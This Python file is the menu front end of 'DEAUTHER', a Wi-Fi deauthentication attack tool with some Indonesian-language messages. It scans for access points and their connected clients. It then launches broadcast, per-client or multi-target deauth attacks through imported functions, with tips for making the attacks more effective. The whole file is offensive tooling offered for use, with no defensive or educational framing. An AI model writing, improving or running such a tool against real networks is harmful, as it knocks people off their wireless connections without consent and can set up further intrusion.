#!/usr/bin/env python3
# ============================================================
# DEAUTHER - Multi-Target Deauthentication Tool
# ============================================================
# Optimized for same-channel attacks with thermal protection
# ============================================================

import sys
import time
import signal
import atexit
import subprocess

from deauther import (
    # Config
    MAX_TARGETS,
    # Colors
    Color,
    # Utils
    check_root,
    clear_screen,
    cleanup_and_exit,
    # Thermal
    read_temperature,
    get_temp_status,
    start_thermal_monitor,
    # Interface
    get_mon_interface,
    enable_monitor_mode,
    lock_channel_robust,
    restart_driver,
    # Scanner
    get_band_from_channel,
    scan_networks_and_clients,
    scan_networks_live,
    scan_networks_timed,
    # Attack
    kill_all_attacks,
    deauth_attack_single_optimized,
    deauth_attack_clients,
    deauth_attack_multi,
    parse_target_selection
)


def main():
    """Main entry point with CLI menu"""
    check_root()
    
    # Register signal handlers
    signal.signal(signal.SIGINT, cleanup_and_exit)
    signal.signal(signal.SIGTERM, cleanup_and_exit)
    atexit.register(cleanup_and_exit)
    
    # Check for xterm dependency
    if subprocess.call("which xterm >/dev/null", shell=True) != 0:
        print("Install: sudo apt install xterm")
        sys.exit()

    while True:
        clear_screen()
        
        # Show current temperature in menu
        temp = read_temperature()
        temp_display = ""
        if temp is not None:
            status, color = get_temp_status(temp)
            temp_display = f" | {color}TEMP: {temp:.1f}°C ({status}){Color.ENDC}"
        
        print(f"{Color.HEADER}{'='*60}{Color.ENDC}")
        print(f"{Color.HEADER}  MULTI-TARGET DEAUTH (Optimized for Same-Channel){temp_display}{Color.ENDC}")
        print(f"{Color.HEADER}{'='*60}{Color.ENDC}")
        print(f"\n{Color.CYAN}1.{Color.ENDC} Scan & Attack (Broadcast)")
        print(f"{Color.CYAN}2.{Color.ENDC} Stop All Attacks")
        print(f"{Color.CYAN}3.{Color.ENDC} Restart Driver")
        print(f"{Color.CYAN}4.{Color.ENDC} Exit")
        print(f"{Color.GREEN}5.{Color.ENDC} Scan Network & Clients (TARGETED) ✨")
        
        choice = input(f"\n{Color.BOLD}Choice [1-5]: {Color.ENDC}")
        
        if choice == '1':
            handle_broadcast_attack()
        
        elif choice == '2':
            print(f"\n{Color.WARNING}[*] Stopping...{Color.ENDC}")
            kill_all_attacks()
            print(f"{Color.GREEN}[+] Stopped.{Color.ENDC}")
            time.sleep(1)
                
        elif choice == '3':
            restart_driver()
            
        elif choice == '4':
            cleanup_and_exit()
        
        elif choice == '5':
            handle_targeted_attack()


def handle_broadcast_attack():
    """Handle menu option 1: Scan & Attack (Broadcast)"""
    mon = get_mon_interface()
    if not mon: 
        mon = enable_monitor_mode()
    
    # Use timed scan (10 seconds auto-stop)
    nets = scan_networks_timed(mon, duration=10)
    
    if not nets:
        print(f"{Color.FAIL}No targets found.{Color.ENDC}")
        time.sleep(2)
        return
    
    # Table with MAC address column
    print(f"\n{Color.WARNING}No  PWR    CH   BAND   ENC           BSSID              ESSID{Color.ENDC}")
    print("-" * 100)
    for i, n in enumerate(nets):
        band_color = Color.CYAN if n.get('band') == '5G' else Color.GREEN
        enc = n.get('encryption', '?')
        bssid = n.get('bssid', '??:??:??:??:??:??')
        # Color code encryption
        if 'WPA3' in enc:
            enc_color = Color.CYAN
        elif 'WPA2' in enc:
            enc_color = Color.GREEN
        elif 'WEP' in enc or 'OPN' in enc:
            enc_color = Color.FAIL
        else:
            enc_color = Color.WARNING
        print(f"{i+1:<3} {n['power']:>4}   {n['channel']:>3}  {band_color}{n.get('band', '?'):>4}{Color.ENDC}   {enc_color}{enc:<13}{Color.ENDC} {bssid}   {n['essid']}")
    print("-" * 100)
    
    print(f"\n{Color.CYAN}[TIP] Multi: 1,2,3,4,5 (max {MAX_TARGETS}){Color.ENDC}")
    print(f"{Color.GREEN}[TIP] Same channel = OPTIMAL!{Color.ENDC}")
    print(f"{Color.FAIL}[!] JANGAN mix 2.4G + 5G (tidak bisa simultan!){Color.ENDC}")
    
    pilih = input(f"\n{Color.BOLD}Target numbers ('m' for menu): {Color.ENDC}")
    
    if pilih.lower() == 'm':
        return
    
    indices = parse_target_selection(pilih, len(nets))
    
    if indices is None or len(indices) == 0:
        print(f"{Color.FAIL}[!] No valid targets.{Color.ENDC}")
        time.sleep(2)
        return
    
    if len(indices) > MAX_TARGETS:
        print(f"{Color.FAIL}[!] Max {MAX_TARGETS} targets!{Color.ENDC}")
        indices = indices[:MAX_TARGETS]
        time.sleep(2)
    
    selected_targets = [nets[i-1] for i in indices]
    
    # Check if mixing bands
    bands = set([t.get('band', '?') for t in selected_targets])
    if len(bands) > 1 and '2.4G' in bands and '5G' in bands:
        print(f"\n{Color.FAIL}{'='*60}{Color.ENDC}")
        print(f"{Color.FAIL}[ERROR] TIDAK BISA mix 2.4GHz dan 5GHz!{Color.ENDC}")
        print(f"{Color.FAIL}{'='*60}{Color.ENDC}")
        print(f"{Color.WARNING}Alasan: 1 adapter hanya bisa di 1 band pada satu waktu.{Color.ENDC}")
        print(f"{Color.CYAN}Pilih target dari band yang SAMA saja.{Color.ENDC}")
        input(f"\n{Color.BOLD}Press Enter...{Color.ENDC}")
        return
    
    # Check if same channel
    channels = set([t['channel'] for t in selected_targets])
    if len(channels) > 1:
        print(f"\n{Color.WARNING}[WARNING] Targets di {len(channels)} channel berbeda:{Color.ENDC}")
        for ch in channels:
            targets_in_ch = [t['essid'] for t in selected_targets if t['channel'] == ch]
            band = get_band_from_channel(ch)
            print(f"  CH {ch} ({band}): {', '.join(targets_in_ch)}")
        print(f"\n{Color.FAIL}[!] Efektivitas akan <30%!{Color.ENDC}")
    else:
        print(f"\n{Color.GREEN}[OPTIMAL] Semua di channel {list(channels)[0]}!{Color.ENDC}")
    
    kill_all_attacks()
    
    if len(selected_targets) == 1:
        target = selected_targets[0]
        print(f"\n{Color.FAIL}[SINGLE TARGET]{Color.ENDC}")
        print(f"  Target: {target['essid']}")
        print(f"  Channel: {target['channel']}")
        
        # Lock channel untuk single target juga
        if lock_channel_robust(mon, target['channel']):
            deauth_attack_single_optimized(target, mon, 0)
            print(f"{Color.GREEN}[+] Attack running...{Color.ENDC}")
            # Start thermal monitoring for single target
            start_thermal_monitor()
    else:
        deauth_attack_multi(selected_targets, mon)
    
    input(f"\n{Color.BOLD}Press Enter...{Color.ENDC}")


def handle_targeted_attack():
    """Handle menu option 5: Scan Network & Clients (TARGETED)"""
    mon = get_mon_interface()
    if not mon:
        mon = enable_monitor_mode()
    
    print(f"\n{Color.HEADER}{'='*60}{Color.ENDC}")
    print(f"{Color.HEADER}  SCAN NETWORK & CLIENTS (TARGETED MODE){Color.ENDC}")
    print(f"{Color.HEADER}{'='*60}{Color.ENDC}")
    print(f"{Color.CYAN}[INFO] Mode ini lebih efektif karena target client spesifik{Color.ENDC}")
    print(f"{Color.CYAN}[INFO] Scan lebih lama = lebih banyak client terdeteksi{Color.ENDC}")
    
    nets, clients = scan_networks_and_clients(mon)
    
    if not nets:
        print(f"{Color.FAIL}[!] No networks found.{Color.ENDC}")
        time.sleep(2)
        return
    
    # Display networks with MAC address
    print(f"\n{Color.WARNING}=== NETWORKS FOUND ==={Color.ENDC}")
    print(f"{Color.WARNING}No  PWR    CH   BAND   ENC           CLIENTS  BSSID              ESSID{Color.ENDC}")
    print("-" * 110)
    for i, n in enumerate(nets):
        # Count clients for this network
        client_count = len([c for c in clients if c['bssid'] == n['bssid']])
        client_indicator = f"{Color.GREEN}{client_count:>2}{Color.ENDC}" if client_count > 0 else " 0"
        band_color = Color.CYAN if n.get('band') == '5G' else Color.GREEN
        enc = n.get('encryption', '?')
        bssid = n.get('bssid', '??:??:??:??:??:??')
        # Color code encryption
        if 'WPA3' in enc:
            enc_color = Color.CYAN
        elif 'WPA2' in enc:
            enc_color = Color.GREEN
        elif 'WEP' in enc or 'OPN' in enc:
            enc_color = Color.FAIL
        else:
            enc_color = Color.WARNING
        print(f"{i+1:<3} {n['power']:>4}   {n['channel']:>3}  {band_color}{n.get('band', '?'):>4}{Color.ENDC}   {enc_color}{enc:<13}{Color.ENDC} {client_indicator}       {bssid}   {n['essid']}")
    print("-" * 110)
    
    # Show client summary
    if clients:
        print(f"\n{Color.GREEN}[+] Total {len(clients)} clients detected!{Color.ENDC}")
    else:
        print(f"\n{Color.WARNING}[!] No clients detected. Try scanning longer.{Color.ENDC}")
    
    pilih = input(f"\n{Color.BOLD}Select AP to attack ('m' for menu): {Color.ENDC}")
    
    if pilih.lower() == 'm':
        return
    
    if not pilih.isdigit():
        print(f"{Color.FAIL}[!] Invalid input.{Color.ENDC}")
        time.sleep(2)
        return
    
    ap_idx = int(pilih) - 1
    if ap_idx < 0 or ap_idx >= len(nets):
        print(f"{Color.FAIL}[!] Invalid selection.{Color.ENDC}")
        time.sleep(2)
        return
    
    selected_ap = nets[ap_idx]
    ap_clients = [c for c in clients if c['bssid'] == selected_ap['bssid']]
    
    print(f"\n{Color.HEADER}Selected: {selected_ap['essid']}{Color.ENDC}")
    print(f"  BSSID: {selected_ap['bssid']}")
    print(f"  Channel: {selected_ap['channel']}")
    print(f"  Power: {selected_ap['power']} dBm")
    
    if not ap_clients:
        print(f"\n{Color.WARNING}[!] Tidak ada client terdeteksi untuk AP ini.{Color.ENDC}")
        print(f"{Color.CYAN}[?] Gunakan broadcast deauth? (y/n): {Color.ENDC}", end="")
        use_broadcast = input()
        
        if use_broadcast.lower() == 'y':
            kill_all_attacks()
            if lock_channel_robust(mon, selected_ap['channel']):
                deauth_attack_single_optimized(selected_ap, mon, 0)
                print(f"{Color.GREEN}[+] Broadcast attack running...{Color.ENDC}")
            input(f"\n{Color.BOLD}Press Enter...{Color.ENDC}")
        return
    
    # Display clients for selected AP
    print(f"\n{Color.GREEN}=== CONNECTED CLIENTS ({len(ap_clients)}) ==={Color.ENDC}")
    print(f"{Color.WARNING}No\tPWR\tPACKETS\tCLIENT MAC{Color.ENDC}")
    print("-" * 60)
    for i, c in enumerate(ap_clients):
        print(f"{i+1}\t{c['power']}\t{c['packets']}\t{c['station_mac']}")
    print("-" * 60)
    
    print(f"\n{Color.CYAN}Options:{Color.ENDC}")
    print(f"  'a' = Attack ALL clients (max {MAX_TARGETS})")
    print(f"  '1,2,3' = Attack specific clients")
    print(f"  'b' = Broadcast attack (no specific client)")
    
    client_choice = input(f"\n{Color.BOLD}Choice: {Color.ENDC}")
    
    kill_all_attacks()
    
    if client_choice.lower() == 'a':
        # Attack all clients
        deauth_attack_clients(selected_ap, ap_clients, mon)
    elif client_choice.lower() == 'b':
        # Broadcast attack
        if lock_channel_robust(mon, selected_ap['channel']):
            deauth_attack_single_optimized(selected_ap, mon, 0)
            print(f"{Color.GREEN}[+] Broadcast attack running...{Color.ENDC}")
    else:
        # Specific clients
        client_indices = parse_target_selection(client_choice, len(ap_clients))
        if client_indices and len(client_indices) > 0:
            selected_clients = [ap_clients[i-1] for i in client_indices[:MAX_TARGETS]]
            deauth_attack_clients(selected_ap, selected_clients, mon)
        else:
            print(f"{Color.FAIL}[!] Invalid selection.{Color.ENDC}")
            time.sleep(2)
            return
    
    input(f"\n{Color.BOLD}Press Enter...{Color.ENDC}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cleanup_and_exit()
    except Exception as e:
        print(f"{Color.FAIL}[ERROR] {e}{Color.ENDC}")
        cleanup_and_exit()
